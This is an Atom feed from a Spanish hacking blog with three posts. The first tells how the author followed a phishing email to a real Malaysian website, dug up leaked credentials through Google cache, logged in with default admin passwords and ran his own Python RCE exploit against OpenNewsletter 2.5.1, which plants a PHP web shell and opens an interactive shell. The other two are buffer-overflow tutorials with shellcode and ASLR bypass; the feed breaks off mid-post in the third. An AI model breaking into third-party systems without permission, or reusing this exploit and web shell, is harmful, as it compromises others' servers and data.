<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[q3rv0]]></title>
  <link href="http://q3rv0.github.io/atom.xml" rel="self"/>
  <link href="http://q3rv0.github.io/"/>
  <updated>2014-12-17T21:39:30+06:30</updated>
  <id>http://q3rv0.github.io/</id>
  <author>
    <name><![CDATA[q3rv0]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Del spam a la intrusion]]></title>
    <link href="http://q3rv0.github.io/blog/2014/12/15/del-spam-a-la-intrusion/"/>
    <updated>2014-12-15T00:33:48+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/12/15/del-spam-a-la-intrusion</id>
    <content type="html"><![CDATA[<p>Prologo</p>

<p>Hacia rato que no le echaba una ojeada al spam de mi gmail y esta vez tenia el basurin lleno, es que muchas veces uno puede encontrarse envuelto en alguna aventurita que te alegre el dia o no, en este caso mas que nada fue un poco de diversion. En fin, mientras leia los subject de los correos me pare en uno que decia: &ldquo;Your account has ben blocked&rdquo;.<!--more--></p>

<p><img src="http://i.imgur.com/pZT4QvO.png"></p>

<p>Era un mail &ldquo;supuestamente&rdquo; eviando desde blockchain, pero como no tenia idea que servicio estaba prestando al publico me fui directamente a la url del sitio.</p>

<p><a href="https://blockchain.info/">https://blockchain.info/</a></p>

<p><img src="http://i.imgur.com/2F6W0PB.png"></p>

<p>La verdad es que nunca me habia logueado en la aplicacion (segun recuerdo), es mas no tengo una cuenta referenciada a este tipo de servicios en general. Al instante y era obvio deduje que se trataba de un caso de phishing, asi que sin dudarlo segui el enlace acortado por goo.gl para afirmar lo antes predicho.</p>

<p><img src="http://i.imgur.com/9b6q9pg.png"></p>

<p>Por desgracia el path del fake no se encontraba, asi que por curiosidad quize seguir por mi parte para cersiorarme de si habia sido movido a otra ruta o es mas, para ver si lograba captar otros tipos de fraudes montados en el mismo hosting, pero&hellip;como hiba a saber eso? &hellip;</p>

<p>Un poco de Google Hacking</p>

<p>Lo primero que hice fue arrancar a jugar con goo*, buscando diversas extenciones de ficheros, hasta que di con algo interesante.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site:klsicci.com.my ext:txt</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/3KBiyMd.png"></p>

<p>Archivos de configuracion en texto plano!, lamentablemente al pedirlos no se encontraban mas en la ruta, pero si google los tenia, habria que negociar con el.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cache:http://klsicci.com.my/admintest1/config/klsiccic4.txt</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/CN3KSrM.png"></p>

<p>Anque las credenciales podian ser viejas o con suerte, quizas, seguian en uso, no perdia nada con probar.</p>

<p>Trate de establer una conexion por mysql pero me nego el acceso, lo mas probable es que solo admitia conexiones desde localhost o bien mediante una lista de ips habilitadas.</p>

<p>Ya que conocia el user a travez del path /home/klsiccic/ informacion que habia obtenido de los ficheros cacheados, intente loguearme por ftp mediante el password de la db (Me he encontrado con muchos hostings que usan pass global para diferentes servicios), pero esta vez el ftp me reboto.</p>

<p>Todavia faltaba mucho por analizar, asi que segui probando con goog*.</p>

<p>Queria un acceso rapido, entonces pense que podria estar cacheada la webshell del atacante, si es que realmente habia usado una para obtener acceso.</p>

<p>Luego de persistir con un par de strings</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site:klsicci.com.my && inurl:shell</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/TSNZpb8.png"></p>

<p>Di con el objetivo, pero nuevamente el 404.</p>

<p>Por un lado me incitaba a seguir buscando ya que tenia el title de la webshell que podria ser la herramienta del spammer. Hasta ahora no queria cersiorarme por completo hasta estar seguro de que fuera el autor del echo, tal vez la webshell podria pertenecer a otro intruder que nada tenia que ver con el scam.</p>

<p>Largue otra busqueda.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site:klsicci.com.my && intitle:"=[ 1n73ct10n privat shell ]="</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/hq8hxbf.png"></p>

<p>Y esta vez tenia un lindo historial, pero todos apuntaban a la misma url fallida.</p>

<p>Aprovechando la lista obtenida, encuentro entre los path que se le pasaban como parametro a la ex shell, un dir de nombre /opennews.</p>

<p><img src="http://i.imgur.com/6fRzOJr.png"></p>

<p><img src="http://i.imgur.com/7za4QMt.png"></p>

<p>Opennewsletter es una aplicacion open-source para administrar listas de mails.</p>

<p>OpenBUGletter</p>

<p>Ravisando en exploit-db encuentro un reporte de multiples vulnerabilidades para las versiones &lt;=2.*. Una de ellas y por cierto la mas critica hablaba de un RCE en la plataforma.</p>

<p><a href="http://www.exploit-db.com/exploits/2981/">http://www.exploit-db.com/exploits/2981/</a></p>

<p>Para ser aprovechado requieria de acceso a la administracion, investigando un poco en el source de opennews el cual lo obtuve de la siguiente web.</p>

<p><a href="http://www.sourcexref.com/xref/opennewsletter/nav.html">http://www.sourcexref.com/xref/opennewsletter/nav.html</a></p>

<p>Veo que las credenciales del admin son tomadas desde config.php y el user, pass por defecto es admin:admin.</p>

<p><img src="http://i.imgur.com/0hWTNj4.png"></p>

<p>Por suerte el fichero no habia sido retocado y pude obtener acceso.</p>

<p><img src="http://i.imgur.com/6PRAemn.png"></p>

<p>Por razones que desconocia el exploit no lograba darme una shell en el sistema, asi que me puse a leer el codigo para ver donde se daba el bug, mirando en subscribers.php se puede ver como se abre el fichero data.dat y se ingresa el contenido de la variable $_POST[&lsquo;email] sin sanitizar.</p>

<p><img src="http://i.imgur.com/lbJNGtc.png"></p>

<p>En settings.php se permite renombrar el mismo a travez de la variable $_POST[&lsquo;db_file&rsquo;] que al igual que la anterior no posee ningun tipo de filtro seguro.</p>

<p><img src="http://i.imgur.com/CXxwXJ8.png"></p>

<p>Ahora que ya tenia una idea de como inyectar codigo, lo unico que quedaba era incrustar un payload en data.dat y este a su vez renombrarlo a *.php, mirando nuevamente el exploit me doy cuenta que para ingresar el codigo hace una peticion a subscribe.php (fichero que no existe en esta version de opennews (2.5.1)), ademas del pasaje de parametros por GET.</p>

<p><img src="http://i.imgur.com/b36Mm54.png"></p>

<p>Asi que decidi codear el mio propio para realizar la explotacion.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c"># Description: Opennewsletter remote code execution exploit</span>
</span><span class='line'><span class="c"># Version tested: 2.5.1</span>
</span><span class='line'><span class="c"># Author: q3rv0</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">opennews_exploit</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">=</span><span class="n">host</span>
</span><span class='line'>        <span class="n">cookies</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPCookieProcessor</span><span class="p">()</span>
</span><span class='line'>        <span class="n">opener</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
</span><span class='line'>        <span class="n">urllib2</span><span class="o">.</span><span class="n">install_opener</span><span class="p">(</span><span class="n">opener</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">postSend</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">parametros</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">&quot;User-Agent&quot;</span><span class="p">:</span><span class="s">&quot;Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0&quot;</span><span class="p">}</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">parametros</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">parametros</span><span class="p">)</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">=</span><span class="n">path</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">post</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">parametros</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">post</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">getOldDbFile</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">+</span><span class="s">&quot;settings.php&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&quot;name=old_db_file value=([\w\.\-_]+)&gt;&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">verifyShell</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="o">=</span><span class="n">path</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">code</span><span class="o">=</span><span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="o">+</span><span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span><span class='line'>            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">code</span><span class="o">.</span><span class="n">getcode</span><span class="p">()</span>
</span><span class='line'>        <span class="k">except</span><span class="p">:</span>
</span><span class='line'>            <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span><span class="o">=</span><span class="s">&quot;http://pwnedhost.com/opennews/&quot;</span>
</span><span class='line'><span class="n">shell</span><span class="o">=</span><span class="s">&quot;shell.php&quot;</span>
</span><span class='line'><span class="n">user</span><span class="o">=</span><span class="s">&quot;admin&quot;</span>
</span><span class='line'><span class="n">passwd</span><span class="o">=</span><span class="s">&quot;admin&quot;</span>
</span><span class='line'><span class="n">admin_name</span><span class="o">=</span><span class="s">&quot;Your Name&quot;</span>
</span><span class='line'><span class="n">admin_email</span><span class="o">=</span><span class="s">&quot;you@domain.com&quot;</span>
</span><span class='line'><span class="n">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span>
</span><span class='line'><span class="n">site_url</span><span class="o">=</span><span class="s">&quot;http://www.yourwebsite.com&quot;</span>
</span><span class='line'><span class="n">opennews_directory</span><span class="o">=</span><span class="s">&quot;/&quot;</span>
</span><span class='line'><span class="n">payload</span><span class="o">=</span><span class="s">&quot;&lt;?php echo `$_POST[exec]`; ?&gt;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">rce</span><span class="o">=</span><span class="n">opennews_exploit</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">get_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[*] Obteniendo la shell :)</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>        <span class="n">command</span><span class="o">=</span><span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;$~: &quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">+</span><span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;exec&quot;</span><span class="p">:</span><span class="n">command</span><span class="p">},</span> <span class="n">shell</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">rce</span><span class="o">.</span><span class="n">verifyShell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span><span class="o">==</span><span class="mi">200</span><span class="p">:</span>
</span><span class='line'>    <span class="n">get_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Logueando...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;username&quot;</span><span class="p">:</span><span class="n">user</span><span class="p">,</span> <span class="s">&quot;password&quot;</span><span class="p">:</span><span class="n">passwd</span><span class="p">},</span> <span class="s">&quot;index.php?action=login&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[*] Insertando el payload...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;email&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">},</span> <span class="s">&quot;subscribers.php?action=add&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[*] Renombrando la shell...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="n">rce</span><span class="o">.</span><span class="n">postSend</span><span class="p">({</span><span class="s">&quot;admin_username&quot;</span><span class="p">:</span><span class="n">user</span><span class="p">,</span> <span class="s">&quot;admin_password&quot;</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span> <span class="s">&quot;admin_name&quot;</span><span class="p">:</span><span class="n">admin_name</span><span class="p">,</span> <span class="s">&quot;admin_email&quot;</span><span class="p">:</span><span class="n">admin_email</span><span class="p">,</span> <span class="s">&quot;charset&quot;</span><span class="p">:</span><span class="n">charset</span><span class="p">,</span> <span class="s">&quot;site_url&quot;</span><span class="p">:</span><span class="n">site_url</span><span class="p">,</span> <span class="s">&quot;opennewsletter_dir&quot;</span><span class="p">:</span><span class="n">opennews_directory</span><span class="p">,</span> <span class="s">&quot;old_db_file&quot;</span><span class="p">:</span><span class="n">rce</span><span class="o">.</span><span class="n">getOldDbFile</span><span class="p">(),</span> <span class="s">&quot;db_file&quot;</span><span class="p">:</span><span class="n">shell</span><span class="p">,</span> <span class="s">&quot;action&quot;</span><span class="p">:</span><span class="s">&quot;update&quot;</span><span class="p">},</span> <span class="s">&quot;settings.php&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">get_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<blockquote><p>Cabe decir que el codigo del exploit es a modo de POC, solo fue testeado en la version 2.5.1, podria no funcionar en versiones anteriores.</p></blockquote>


<p>run exploit</p>

<p><img src="http://i.imgur.com/45SiCdg.png?1"></p>

<p>Listo! ya estaba dentro.</p>

<p><img src="http://i.imgur.com/2tssG3F.png"></p>

<p>Buscando rastros del scam.</p>

<p>Luego de darle vueltas durante un rato, entrar y salir de directorios, darle a find como loco, no pude dar con el phishing, las historias nunca terminan como uno quiere,  eso me sacaba de la duda de que seguramente el admin se habia encargado de el. Pero por otra parte encontre ciertos ficheros que comprometian aun mas al spammer/intruder.</p>

<p>El pequeño arsenal del defacer.</p>

<p><img src="http://i.imgur.com/7Ri8TTI.png"></p>

<p>Ojala les haya gustado esta hackanecdota, saludos!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Desbordando el buffer en linux x86 (III) [ASLR bypass]]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/"/>
    <updated>2014-11-24T21:47:55+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass</id>
    <content type="html"><![CDATA[<p>Esta es la tercera  parte de una serie de tutoriales para aprender a explotar el buffer en sistemas Linux x86. En el anterior apartado se logro encastrar codigo ejecutable y obtener una shell, pero para lograrlo debimos desactivar previamente ASLR.  Como explique anteriormente este sistema de seguridad nos dificulta un<!--more--> poco las cosas randomizando la memoria.</p>

<p>Compilaremos el siguiente codigo que sera usado durante la realizacion de este tutorial.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">funcion_vulnerable</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">input</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">funcion_vulnerable</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Verificamos que ASLR se encuentra activo.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2
</span></code></pre></td></tr></table></div></figure>


<p>De otra manera lo activaremos.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">2</span> &gt; /proc/sys/kernel/randomize_va_space
</span></code></pre></td></tr></table></div></figure>


<p>Ahora simplemente realizaremos los pasos descriptos en los anteriores capitulos.</p>

<p>Compilamos el code.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -o vuln -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -ggdb -z execstack vuln.c
</span></code></pre></td></tr></table></div></figure>


<p>Presten atencion al flag -z execstack, esto simplemente vuelve ejecutable el stack ya que NX (Non-Exec) es otra proteccion que al igual que ASLR nos va a romper bastante las pelotas denegandonos la ejecucion de un shellcode en la memoria.</p>

<p>Pero de todas maneras se puede evadir, tema que se tocara en el proximo tuto.</p>

<p>Buscamos la sobrescritura del EIP.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>r $(python -c 'print "\x41"*1004+"\x42"*4')</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/VsmMcJN.png"></p>

<p>Hasta aca todo muy lindo, pero todavia tenemos que saltarnos ASLR.</p>

<p>Una manera de hacer esto es buscando dentro del binario alguna instruccion de  llamada o salto (CALL/JMP) a algun registro. Por que si nos basamos en seguir el anterior tutorial donde sobrescribiamos el EIP con una direccion dentro de ESP que aputaba a un NOP Sled+Shellcode, simplemente no va a funcar, por el echo de que la memoria va a cambiar en cada ejecucion.</p>

<p>Esto podemos hacerlo con objdump.</p>

<p>Buscaremos la existencia de alguna instruccion CALL</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>objdump -d vuln<span class="p">|</span>grep call
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/WcOw5wZ.png"></p>

<p><img src="http://i.imgur.com/2cbfPTg.png"></p>

<p>Perfecto, objdump nos arroja dos direcciones que llaman al registro EAX.</p>

<p>8048387</p>

<p>804840f</p>

<p>Entonces se nos ocurre que si podemos escribir en EAX nuestro shellcode y pintar el EIP con la direccion CALL lograriamos realmente “pintarle la cara a ASLR”.</p>

<p>Bien, hay una parte del buffer en EAX?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $eax</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/8MiR1WD.png"></p>

<p>Como se aprecia, logramos tocar el comienzo del registro, ahora solamente nos falta generar el payload.</p>

<p>Ahora si nos apoyaremos en  MSF para moldear un Shellcode.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; msfpayload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>/bin/bash C
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/b5EaI5R.png"></p>

<p>El unico problema que surge, es que si miramos el shellcode, este contiene “badchars”, como por ejemplo la presencia de nullbytes \x00 que nos van a cortar la cadena.</p>

<p>Asi que le pasamos la salida a msfencode para ofuscar un poco el code.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; msfpayload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>/bin/bash R<span class="p">|</span>msfencode -a x86 -e x86/alpha_mixed -b <span class="s1">&#39;x\00\x0d\x0a&#39;</span> -t c
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/Z4R607W.png"></p>

<p>Fijense en el flag -b de msfencode y entre comillas la lista de badchars a evadir.</p>

<p>Ahora tenemos el codigo limpio y listo para agregarlo al payload que quedara de la siguiente manera.</p>

<p>Le restamos la longitud del Shellcode al buffer.</p>

<p>1004-152=852</p>

<p>Menos 400 NOPS que iran antes del EIP, quedando el vector de la siguiente manera</p>

<p>NOPS<em>452+Shellcode(152)+NOPS</em>400+EIP (call eax \x87\x83\x04\x08)</p>

<p>Lanzamos el exploit</p>

<p><img src="http://i.imgur.com/g1TDSom.png"></p>

<p>Logrando esquivar satisfactoriamente ASLR.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Desbordando el buffer en linux x86 (II) [NOP Sled]]]></title>
    <link href="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/"/>
    <updated>2014-11-24T21:32:57+06:30</updated>
    <id>http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled</id>
    <content type="html"><![CDATA[<p>En el anterior post se hizo una pequeña introduccion al funcionamiento del stack y a los registros del procesador, ademas se logro modificar el flujo<!--more--> de datos de un programa para que atente a una funcion que no habia sido llamada.</p>

<p>En este nuevo apartado se vera como inyectar un shellcode en la memoria para lograr ejecutar codigo a travez del desbordamiento.</p>

<p>Para el poc se va a utlizar el mismo source que la vez pasada salvo que el buffer aumentara su tamaño a 500 bytes.
Seguimos lo mismos pasos que en el paper anterior.</p>

<p>Desactivamos ASLR</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></code></pre></td></tr></table></div></figure>


<p>y compilamos</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -ggdb -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -o vuln vuln.c
</span></code></pre></td></tr></table></div></figure>


<p>Abrimos gdb y arrancamos por pasarle 506 caracteres</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x41"*506')</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/mGWY0Ol.png?1"></p>

<p>Ya vemos como se va llenando el EIP</p>

<p>Agregamos 2 mas y lo terminamos de completar.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run $(python -c 'print "\x41"*508')</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/R9umyqW.png?1"></p>

<p>Ahora bien hasta aca todo perfecto, ahora tenemos que buscar donde poder incrustar el shellcode.</p>

<p>Un shellcode no es mas que un conjunto de instrucciones en ensamblador programado para una tarea especifica, el shellcode que se vera a continuacion nos dara una sesion sh en el sistema. Como dije anteriormente una vez que pasamos el tamaño limite del buffer, los datos comienzan a escribirse en los demas registros, entonces vamos a ver en que otro lugar se mandaron las A’s, si le echamos una ojeada al registro ESP.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
